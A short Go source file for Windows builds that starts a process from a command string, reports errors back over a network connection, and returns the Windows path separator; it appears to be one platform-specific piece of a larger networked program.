// +build windows

package main

import (
	"fmt"
	"net"
	"os/exec"
)

func runCommand(cmdStr string, c net.Conn) {
	var cmd *exec.Cmd
	fmt.Println("-------- ", cmdStr)
	cmd = exec.Command(cmdStr)
	err := cmd.Start()
	if err != nil {
		Error.Println(err)
		c.Write([]byte(err.Error() + "\n"))
	} else {
		c.Write([]byte("\n"))
	}
}

func pathSeparator() string {
	return "\\"
}
